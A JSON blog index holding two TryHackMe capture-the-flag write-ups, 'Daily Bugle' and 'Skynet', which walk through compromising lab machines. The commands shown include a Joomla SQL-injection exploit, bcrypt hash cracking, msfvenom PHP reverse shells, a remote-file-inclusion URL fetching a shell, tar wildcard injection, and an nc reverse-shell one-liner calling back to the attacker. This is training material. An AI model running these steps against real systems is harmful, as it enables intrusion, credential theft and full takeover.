[
  
  {
    "title": "TryHackMe Daily Bugle",
    "url": "/posts/daily_bugle/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2025-01-03 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are instructed as follows:  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.And we are given the t...",
    "content": "Information GatheringWe are instructed as follows:  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.And we are given the target IP address 10.10.89.186.Our objectives are to  determine who robbed the bank,  identify the version of Joomla running on the web server,  obtain the user flag, and  obtain the root flag.EnumerationWe begin with an nmap scan nmap -sS -T5 -sC -sV 10.10.89.186, revealingPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-generator: Joomla! - Open Source Content Management|_http-title: Home3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)Upon navigating to the web server on port 80/TCP, the front-page article discloses that it was “Spider-Man” whorobbed the bank.Fuzzing for directories withffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.121.232/FUZZ -icyieldsimages                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 118ms]                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 223ms]media                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 102ms]templates               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms]modules                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 98ms]bin                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 97ms]includes                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 99ms]language                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 98ms]components              [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 100ms]cache                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 100ms]libraries               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 98ms]tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 102ms]administrator           [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 95ms]cli                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 104ms]                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 218ms]To determine the Joomla version, we happen upon the web page https://docs.joomla.org/How_to_check_the_Joomla_version%3F, which suggests that we visit the URL http://10.10.89.186/languages/en-GB/en-GB.xml. However, this endpoint does not exist; instead, we visithttp://10.10.89.186/language/en-GB/en-GB.xml, upon which we find&lt;metafile version=\"3.7\" client=\"site\"&gt;&lt;name&gt;English (en-GB)&lt;/name&gt;&lt;version&gt;3.7.0&lt;/version&gt;...Hence, we conclude that the web server is running Joomla version 3.7.0.ExploitationWe find CVE-2017-8917 after some research. We also find a python implementation at https://github.com/XiphosResearch/exploits/tree/master/Joomblah.Next, we clone the repository withgit clone https://github.com/XiphosResearch/exploits/tree/master. Runningthe exploit with python3 joomblah.py http://10.10.89.186/ outputs[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com','$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']To crack the hash, we create a file hash.txt and copy into it the hash $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm. We then go to the web page https://hashes.com/en/tools/hash_identifier and use the providedtool to discover that the hash type isbcrypt $2*$, Blowfish (Unix). By running hashcat --help, we find thatthe hash mode for this hash is 3200. Then, we pass the file, along with the rockyou.txt wordlist, to hashcatto perform a dictionary attack with the commandhashcat -D 2 -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txtThis quickly reveals Jonah’s cracked password.With this password, we sign in to the Joomla administrative panel at http://10.10.89.186/administrator asthe user jonah, and we generate a php web shell usingmsfvenom -p php/reverse_php -o shell.php LHOST=10.6.4.176.To upload the file, we navigate to the Templates tab and modify the Protostartemplate by copying into index.php the contents from our shell, shell.php.Afterward, we set up a netcat listener with ncat -lvnp 4444 and navigate to http://10.10.89.186/index.php.This gives us a shell as apache.Post-ExploitationBy executing ls -al /home, we notice that the only user with a home directory is jjameson, and that, unfortunately,we do not have read access to /home/jjameson. Nevertheless, we find a file named configuration.php in the web root directory /var/www/html, which contains the linepublic $password = 'DOITURSELF:)';. This password allows us to sign in as jjameson with ssh jjameson@10.10.89.186. We are then able to capture the user flag:Running sudo -l, we notice that we have sudo permissions for yum and use the the method demonstrated in part (b) of the article at https://gtfobins.github.io/gtfobins/yum/ to obtain a root shell. With this shell, we capture the root flag:"
  },
  
  {
    "title": "TryHackMe Skynet",
    "url": "/posts/skynet/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2024-12-30 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are given:  Deploy and compromise the vulnerable machine!Additonally, we are given the target IP 10.10.13.83. Our objectives are as follows:  Obtain Miles’ email password,  ...",
    "content": "Information GatheringWe are given:  Deploy and compromise the vulnerable machine!Additonally, we are given the target IP 10.10.13.83. Our objectives are as follows:  Obtain Miles’ email password,  Identify the hidden directory,  Recall the type of vulnerability wherein one includes a remote file for malicious purposes,  Obtain the user flag, and  Obtain the root flag.EnumerationWe run an nmap scan with nmap -sS -T5 -sC -sV 10.10.13.83 and obtain the followingNmap scan report for 10.10.13.83Host is up (0.097s latency).Not shown: 988 closed tcp ports (reset)PORT      STATE    SERVICE      VERSION22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)80/tcp    open     http         Apache httpd 2.4.18 ((Ubuntu))|_http-title: Skynet|_http-server-header: Apache/2.4.18 (Ubuntu)110/tcp   open     pop3         Dovecot pop3d|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE SASL RESP-CODES TOP139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp   open     imap         Dovecot imapd|_imap-capabilities: IMAP4rev1 more SASL-IR post-login have IDLE capabilities listed LITERAL+ Pre-login OK LOGINDISABLEDA0001 ENABLE ID LOGIN-REFERRALS445/tcp   open     netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)646/tcp   filtered ldp1023/tcp  filtered netvenuechat1042/tcp  filtered afrog3580/tcp  filtered nati-svrloc3905/tcp  filtered mupdate24444/tcp filtered unknownService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required|_clock-skew: mean: 1h59m54s, deviation: 3h27m50s, median: -5s| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time:|   date: 2024-12-30T17:58:47|_  start_date: N/A|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery:|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\\x00|   Domain name: \\x00|   FQDN: skynet|_  System time: 2024-12-30T11:58:47-06:00Nmap done: 1 IP address (1 host up) scanned in 24.43 secondsWe notice SAMBA running on port 445/TCP and enumerate it using nmap --script samba-enum-shares.nse -p 445 10.10.13.83.This revealsHost script results:| smb-enum-shares:|   account_used: guest|   \\\\10.10.13.83\\IPC$:|     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (skynet server (Samba, Ubuntu))|     Users: 1|     Max Users: &lt;unlimited&gt;|     Path: C:\\tmp|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.13.83\\anonymous:|     Type: STYPE_DISKTREE|     Comment: Skynet Anonymous Share|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\srv\\samba|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.13.83\\milesdyson:|     Type: STYPE_DISKTREE|     Comment: Miles Dyson Personal Share|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\home\\milesdyson\\share|     Anonymous access: &lt;none&gt;|     Current user access: &lt;none&gt;|   \\\\10.10.13.83\\print$:|     Type: STYPE_DISKTREE|     Comment: Printer Drivers|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\var\\lib\\samba\\printers|     Anonymous access: &lt;none&gt;|_    Current user access: &lt;none&gt;We notice that we have read and write access on \\\\10.10.13.83\\anonymous. Moreover, it appears that Miles’ personal files are accessible at \\\\10.10.13.83\\milesdyson. However, this share is inaccessible without credentials.On the anonymous share, we find a file attention.txt containingA recent system malfunction has caused various passwords to be changed. All skynetemployees are required to change their password after seeing this.-Miles DysonAdditionally, we obtain some log files, which appear to be the history of the password resets mentioned in attention.txt.Afterward, we move on to the web server at port 80/TCP and fuzz for directories usingffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.13.83/FUZZ -icThis reveals the directory /squirrelmail, allowing us to login into Miles’ email account. The combinationMilesDyson:&lt;MOSTRECENTPASSFROMLOGS&gt; works.In Miles’ inbox, we find the following messageThis password allows us to authenticate to Miles’ SMB share, where we find the file notes/important.txt. Thefile reads1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wifeThis suggests that there is a directory named /45kra24zxs28v3yd. Navigating to http://10.10.13.83/45kra24zxs28v3yd/ reveals Miles’ personal page. The notes/important.txt file suggests that there is a login page available, sowe fuzz usingffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.13.83/45kra24zxs28v3yd/FUZZ -icConsequently, we find a login form at /45kra24zxs28v3yd/administrator/.ExploitationAfter some research, we identify an exploit compatible with this CMS at https://www.exploit-db.com/exploits/25971.To use this exploit, we first generate a php reverse shell with the command msfvenom -p php/reverse_php LHOST=10.6.4.176 -o shell.php. Then, we serve this file using python3 -m http.server and start a netcat listener withncat -lvnp 4444. Finally, we visit the URLhttp://10.10.13.83/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.4.176:8000/shell.phpand receive a shell as www-data. We then obtain the user flag:Post-ExploitationChecking for cron jobs, we execute the command cat /etc/crontab, which returns# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user\tcommand*/1 *\t* * *   root\t/home/milesdyson/backups/backup.sh...The first job seems atypical. At /home/milesdyson/backups/backups.sh, we find#!/bin/bashcd /var/www/htmltar cf /home/milesdyson/backups/backup.tgz *We use wildcard injection to exploit this cron job: first, we cd /var/www/html. Then, we run echo \"\" &gt; '--checkpoint=1andecho \"\" &gt; '--checkpoint-action=exec=bash evil.sh'Lastly, we write a reverse shell evil.sh usingecho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.6.4.176 1234 &gt; /tmp/f\" &gt; evil.shAfter setting up a netcat listener with the command ncat -lvnp 1234,we receive a shell as root.We then obtain the root flag:"
  }
  
]

